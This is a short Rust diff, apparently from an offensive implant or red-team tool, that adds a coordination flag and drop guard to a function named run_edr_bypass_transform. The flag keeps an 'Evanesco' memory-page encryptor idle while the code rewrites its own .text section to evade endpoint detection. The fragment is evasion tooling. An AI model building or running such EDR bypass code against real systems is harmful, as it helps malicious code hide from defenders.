@@ -1408,6 +1408,23 @@ pub fn run_edr_bypass_transform(
 ) -> Result<TransformCycleResult> {
     let start = std::time::Instant::now();
 
+    // MED-009: Set coordination flag so Evanesco page_tracker defers
+    // encryption while we modify .text.
+    #[cfg(all(windows, feature = "evanesco"))]
+    crate::page_tracker::set_transform_in_progress(true);
+
+    // MED-009: Guard to clear the coordination flag on early return (error).
+    #[cfg(all(windows, feature = "evanesco"))]
+    struct TransformFlagGuard;
+    #[cfg(all(windows, feature = "evanesco"))]
+    impl Drop for TransformFlagGuard {
+        fn drop(&mut self) {
+            crate::page_tracker::set_transform_in_progress(false);
+        }
+    }
+    #[cfg(all(windows, feature = "evanesco"))]
+    let _flag_guard = TransformFlagGuard;
+
     let mut frozen = crate::self_reencode::freeze_threads()
         .context("edr_bypass_transform: failed to freeze sibling threads")?;
 
@@ -1565,6 +1582,11 @@ pub fn run_edr_bypass_transform(
 
     // Resume sibling threads.
     frozen.thaw();
+
+    // MED-009: Clear coordination flag so Evanesco page_tracker resumes
+    // normal encryption.
+    #[cfg(all(windows, feature = "evanesco"))]
+    crate::page_tracker::set_transform_in_progress(false);
 
     let elapsed = start.elapsed();
 
